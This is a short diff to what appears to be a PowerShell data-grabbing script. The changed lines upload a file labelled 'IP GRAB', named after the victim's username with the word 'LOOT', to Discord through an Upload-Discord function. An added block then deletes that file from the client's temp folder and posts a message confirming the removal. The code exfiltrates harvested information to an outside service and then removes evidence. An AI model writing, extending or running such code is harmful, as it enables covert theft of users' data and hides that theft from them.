@@ -108,5 +108,10 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
 
 
 #----------------------------------------------------------------------------------------------------------------------------------
+
 #File Sent
-Upload-Discord -text "IP GRAB" -file $env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt
+Upload-Discord -text " ```IP GRAB``` " -file $env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt
+
+#File Delete
+Remove-Item -LiteralPath $env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt
+Upload-Discord -text " ***File removed from Client*** "
